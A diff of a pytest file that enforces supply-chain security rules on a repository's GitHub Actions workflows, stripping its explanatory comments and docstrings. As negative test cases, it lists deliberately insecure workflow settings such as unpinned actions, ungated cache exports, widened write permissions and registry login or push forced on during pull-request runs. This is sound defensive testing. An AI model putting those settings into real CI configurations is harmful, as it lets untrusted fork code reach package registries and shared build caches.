-    # `pull_request:` carries no filters. A `paths:`/`paths-ignore:` key here
-    # would stop the required check from reporting on the PRs it filtered out,
-    # and branch protection would score that silence as a pass. (BaseLoader
-    # renders an empty trigger body as `''`.)
     if isinstance(pull_request, dict):
         assert not {"paths", "paths-ignore"} & set(pull_request), pull_request
     else:
         assert pull_request in ("", None), repr(pull_request)
 
     condition = str(_jobs(workflow)["publish"].get("if", ""))
-    # The only `if:` this job may carry is the prerelease exclusion, which
-    # cannot be true on a pull_request run.
     assert "pull_request" not in condition, condition
     assert "prerelease" in condition, condition
 
 
 def test_edge_image_workflow_is_reachable_from_pull_request() -> None:
-    # The premise of everything above: this workflow really does execute a
-    # fork's Dockerfiles on `pull_request`, and it really is the job that holds
-    # `packages: write`. If either stops being true the assertions above go
-    # quiet, so both are pinned here.
     workflow = _workflow("edge-images.yml")
     assert "pull_request" in _trigger_names(workflow)
     publish = _jobs(workflow)["publish"]
@@ -1914,17 +1633,13 @@ def test_edge_image_workflow_is_reachable_from_pull_request() -> None:
 @pytest.mark.parametrize(
     ("workflow_name", "job", "step_index", "value"),
     [
-        # A moved tag is a moved commit; both required checks run fork code.
         ("edge-images.yml", "publish", 0, "actions/checkout@v4"),
         ("edge-images.yml", "publish", 4, "docker/setup-buildx-action@v3"),
         ("edge-images.yml", "publish", 5, "docker/login-action@v3"),
         ("edge-images.yml", "publish", 7, "docker/build-push-action@v6"),
-        # The ml-worker build action needs the same immutable pin as ml-api.
         ("edge-images.yml", "publish", 8, "docker/build-push-action@v6"),
         ("edge-images.yml", "publish", 15, "actions/upload-artifact@v4"),
-        # A branch ref is worse: it moves on every upstream push.
         ("edge-images.yml", "publish", 0, "actions/checkout@main"),
-        # A 40-char string that is not hex must not pass for a commit.
         ("edge-images.yml", "publish", 0, "actions/checkout@" + "z" * 40),
         ("ci.yml", "lint", 0, "actions/checkout@v4"),
     ],
@@ -1942,13 +1657,9 @@ def test_pull_request_pin_policy_rejects_an_unpinned_action(
 @pytest.mark.parametrize(
     ("step_index", "cache_to"),
     [
-        # Ungated: a fork PR would export into the cross-branch BuildKit cache
-        # that later trusted runs on main restore from.
         (7, "type=gha,scope=edge-ml-api,mode=max"),
         (8, "type=gha,scope=edge-ml-worker,mode=max"),
-        # Gated on the wrong side of the condition.
         (8, "${{ env.PUSH_IMAGES == 'false' && 'type=gha,mode=max' || '' }}"),
-        # Right prefix, but the fallback exports anyway.
         (8, "${{ env.PUSH_IMAGES == 'true' && 'type=gha,mode=max' || 'type=gha' }}"),
     ],
 )
@@ -1963,10 +1674,8 @@ def test_edge_image_policy_rejects_an_ungated_cache_export(step_index: int, cach
 @pytest.mark.parametrize(
     ("target", "permissions"),
     [
-        # Back at the workflow level, where it blankets every job.
         ("workflow", {"contents": "read", "packages": "write"}),
         ("workflow", {"contents": "write"}),
-        # Widened past the one scope the publishing job is allowed.
         ("job", {"contents": "write", "packages": "write"}),
         ("job", {"contents": "read", "packages": "write", "id-token": "write"}),
     ],
@@ -1999,16 +1708,11 @@ def test_edge_image_policy_rejects_a_write_scope_on_a_second_job() -> None:
 @pytest.mark.parametrize(
     ("step_index", "field", "value"),
     [
-        # Logging in to ghcr.io on a PR run is the whole thing the gate stops.
         (5, "if", "always()"),
-        # Pushing an image built from a PR's own Dockerfile.
         (7, "push", "true"),
         (8, "push", "true"),
-        # Re-tagging a published digest is a registry write with no `push:`
-        # input, so it needs the gate just as much as a build does.
         (10, "if", "always()"),
         (11, "if", "env.BUILD_ML_WORKER != 'true'"),
-        # An artifact upload on a PR run publishes an unpullable digest.
         (15, "if", "always()"),
     ],
 )
@@ -2029,11 +1733,7 @@ def test_edge_image_policy_rejects_an_ungated_token_consumer(
 @pytest.mark.parametrize(
     ("step_index", "why"),
     [
-        # Removing the login step rather than un-gating it must not read as "no
-        # ungated consumer found, therefore safe".
         (5, "registry login"),
-        # Same for the boot smoke: deleting it is the required check silently
-        # becoming a build-only gate again, which is the #195 failure mode.
         (9, "boot smoke"),
     ],
 )
@@ -2065,15 +1765,12 @@ def _assert_edge_image_boot_smoke_and_direct_load(workflow: dict[str, object]) -
     worker = next(s for s in steps if s.get("name") == "Build and push ml-worker image")
     assert worker["with"]["load"] == "${{ env.RELEASE_BUILD != 'true' }}"
     assert "outputs" not in worker["with"]
-    # Release and reuse behavior stays digest-based; release builds still push
-    # an attested index, with no explicit local-load request.
     assert worker["with"]["provenance"] == "${{ env.RELEASE_BUILD == 'true' }}"
     assert worker["with"]["push"] == _PUSH_GATE_EXPR
     assert 'SMOKE_REF="$IMAGE_NAMESPACE/ml-worker@$ML_WORKER_DIGEST"' in str(pull[0]["run"])
 
 
 def test_edge_image_boot_smoke_shapes_are_exact_complements() -> None:
-    """Every build boots exactly once: direct local image or published digest."""
     _assert_edge_image_boot_smoke_and_direct_load(_workflow("edge-images.yml"))
 
 
@@ -2153,33 +1850,15 @@ def test_pull_request_secret_policy_allows_a_secret_behind_a_non_pr_job_gate() -
         "steps": [],
     }
 
-    # A job that cannot start on a pull_request run is out of scope for this
-    # control -- otherwise the rule would forbid every publishing workflow.
     _assert_no_pull_request_secret_access("edge-images.yml", workflow)
 
 
 def test_pull_request_workflow_discovery_ignores_workflows_without_the_trigger() -> None:
-    # release.yml grants `contents: write` and `actions: write` to the job that
-    # creates the GitHub Release, and is safe precisely because `pull_request`
-    # cannot start it. It must stay outside the discovered set, or the rules
-    # above would be asserting the wrong thing.
     assert "release.yml" in _tracked_workflows()
     assert "release.yml" not in _pull_request_workflows()
     assert "pull_request" not in _trigger_names(_workflow("release.yml"))
 
 
-# ---------------------------------------------------------------------------
-# The shard partition is an exact cover of the suite.
-#
-# `ci-ok` turns green when all four shards pass, which says nothing about
-# whether the four shards between them ran every test. The partition is
-# recomputed here from the tracked tree using the same rule the workflow uses,
-# and the cover is asserted rather than assumed.
-# ---------------------------------------------------------------------------
-
-#: pytest's `python_files` default -- `test_*.py` *and* `*_test.py`, at any
-#: depth. pyproject.toml overrides neither, so this is what a bare `pytest` run
-#: (which is what CI did before the shard) collects.
 _PYTEST_FILE_PATTERN = re.compile(r"(?:^|/)(?:test_[^/]*|[^/]*_test)\.py$")
 
 _SHARD_EXCLUSIONS = frozenset()
@@ -2192,7 +1871,6 @@ def _tracked_paths() -> tuple[str, ...]:
 
 
 def _collectible_test_files() -> list[str]:
-    """Every present tracked file a bare `pytest` run would collect as a test module."""
     return sorted(
         path
         for path in _tracked_paths()
@@ -2201,12 +1879,6 @@ def _collectible_test_files() -> list[str]:
 
 
 def _round_robin(files: list[str], total: int) -> dict[int, list[str]]:
-    """The workflow's `awk 'NR % total == shard % total'`, in Python.
-
-    `awk` numbers records from 1, so shard N takes the files whose 1-based index
-    is congruent to N modulo `total` -- and shard `total` takes the ones
-    congruent to 0.
-    """
     return {
         shard: [path for index, path in enumerate(files, start=1) if index % total == shard % total]
         for shard in range(1, total + 1)
@@ -2218,16 +1890,12 @@ def _assert_exact_cover(expected: list[str], partition: dict[int, list[str]], to
 
     assigned: list[str] = []
     for shard in range(1, total + 1):
-        # An empty shard means the partition is finer than the suite; the
-        # workflow fails such a shard loudly rather than passing on nothing.
         assert partition[shard], f"shard {shard} of {total} is empty"
         assigned.extend(partition[shard])
 
-    # No overlap: a file running twice wastes a runner and hides an ordering bug.
     duplicates = sorted({path for path in assigned if assigned.count(path) > 1})
     assert not duplicates, duplicates
 
-    # Exact cover: nothing collectible is left unrun by every shard.
     missing = sorted(set(expected) - set(assigned))
     assert not missing, missing
     extra = sorted(set(assigned) - set(expected))
@@ -2236,11 +1904,8 @@ def _assert_exact_cover(expected: list[str], partition: dict[int, list[str]], to
 
 def test_shard_partition_is_an_exact_cover_of_the_suite() -> None:
     collectible = _collectible_test_files()
-    # The exclusion list is closed: every name in it must still be tracked, so a
-    # renamed or deleted file cannot leave a stale excuse behind.
     assert set(collectible) >= _SHARD_EXCLUSIONS, sorted(_SHARD_EXCLUSIONS - set(collectible))
     expected = [path for path in collectible if path not in _SHARD_EXCLUSIONS]
-    # Guard against a discovery bug that finds nothing and then "covers" it.
     assert len(expected) > 250, len(expected)
 
     _assert_exact_cover(expected, _round_robin(expected, _SHARD_TOTAL), _SHARD_TOTAL)
@@ -2255,13 +1920,6 @@ def test_shard_total_matches_the_matrix_and_the_partition_step() -> None:
 
 
 def test_shard_discovery_in_ci_matches_the_partition_modelled_here() -> None:
-    """The shell half and the Python half of the contract are the same rule.
-
-    Everything above re-derives the partition in Python. That is only evidence
-    about CI if the workflow discovers the same files, so the discovery pipeline
-    is compared against the constant the allowlist pins byte for byte, and the
-    pieces the Python model depends on are each pinned individually.
-    """
     step = next(
         step
         for step in _jobs(_workflow("ci.yml"))["test"]["steps"]
@@ -2269,24 +1927,18 @@ def test_shard_discovery_in_ci_matches_the_partition_modelled_here() -> None:
     )
     run = str(step["run"])
     assert run.startswith(_SHARD_DISCOVERY)
-    # pytest's own default globs, not the narrower `tests/test_*.py`.
     assert "grep -E '(^|/)(test_[^/]*|[^/]*_test)\\.py$'" in _SHARD_DISCOVERY
-    # Repository-wide, so a test module outside tests/ cannot fall through.
     assert "git ls-files -- '*.py'" in _SHARD_DISCOVERY
-    # Byte-identical exclusion, and nothing else excluded.
     for excluded in _SHARD_EXCLUSIONS:
         assert f"grep -vxF '{excluded}'" in _SHARD_DISCOVERY.replace("\n", "")
     assert _SHARD_DISCOVERY.count("grep -vxF") == len(_SHARD_EXCLUSIONS)
-    # Deterministic order, so the same file lands in the same shard every run.
     assert "LC_ALL=C sort" in _SHARD_DISCOVERY
     assert "'NR % total == shard % total'" in _SHARD_DISCOVERY
-    # And the matrix value reaches the script as data, never as spliced source.
     assert step["env"]["SHARD"] == "${{ matrix.shard }}"
     assert "${{ matrix.shard }}" not in run
 
 
 def _ci_shard_discovery_script() -> str:
-    """The `mapfile` block from ci.yml's shard step, taken from the workflow."""
     step = next(
         step
         for step in _jobs(_workflow("ci.yml"))["test"]["steps"]
@@ -2317,15 +1969,6 @@ def _run_ci_shard_discovery(shard: int) -> list[str]:
 
 
 def test_ci_shard_discovery_really_selects_the_modelled_partition() -> None:
-    """Run the workflow's own discovery and compare it to the model.
-
-    Everything above reasons about a partition computed in Python. This is the
-    step that makes that reasoning evidence about CI: the `mapfile` pipeline is
-    lifted out of ci.yml and executed, shard by shard, against this very
-    checkout, and the four results must be the exact cover asserted above.
-    Under the pathspec the shard shipped with this fails outright as soon as a
-    `*_test.py` or a nested `tests/**/test_*.py` file is tracked.
-    """
     expected = _round_robin(
         [path for path in _collectible_test_files() if path not in _SHARD_EXCLUSIONS],
         _SHARD_TOTAL,
@@ -2342,10 +1985,6 @@ def test_ci_shard_discovery_really_selects_the_modelled_partition() -> None:
 
 
 def test_cover_check_catches_the_pathspec_that_dropped_files() -> None:
-    # This is the defect the shard shipped with: `git ls-files 'tests/test_*.py'`
-    # matches neither `tests/foo_test.py` nor `tests/unit/test_x.py`, yet pytest
-    # collects both. Under the old pathspec those two ran in NO shard while every
-    # shard -- and therefore `ci-ok` -- went green.
     tree = ["tests/test_a.py", "tests/test_b.py", "tests/foo_test.py", "tests/unit/test_x.py"]
     assert all(_PYTEST_FILE_PATTERN.search(path) for path in tree)
     old_pathspec = ["tests/test_a.py", "tests/test_b.py"]
@@ -2365,7 +2004,6 @@ def test_cover_check_catches_an_overlapping_partition() -> None:
 def test_cover_check_catches_an_empty_shard() -> None:
     tree = ["tests/test_a.py"]
 
-    # One file across two shards leaves one of them with nothing to run.
     with pytest.raises(AssertionError):
         _assert_exact_cover(tree, _round_robin(tree, 2), 2)
 
@@ -2376,13 +2014,11 @@ def test_cover_check_catches_a_file_no_shard_would_run() -> None:
     partition[1] = []
     partition[2] = tree
 
-    # Reshuffling until nothing is empty must not paper over a dropped file.
     with pytest.raises(AssertionError):
         _assert_exact_cover(tree, partition, 2)
 
 
 def test_round_robin_matches_the_awk_indexing() -> None:
-    # `awk` counts records from 1, so shard 4 of 4 is the NR % 4 == 0 bucket.
     files = [f"tests/test_{index}.py" for index in range(1, 9)]
     partition = _round_robin(files, 4)
 
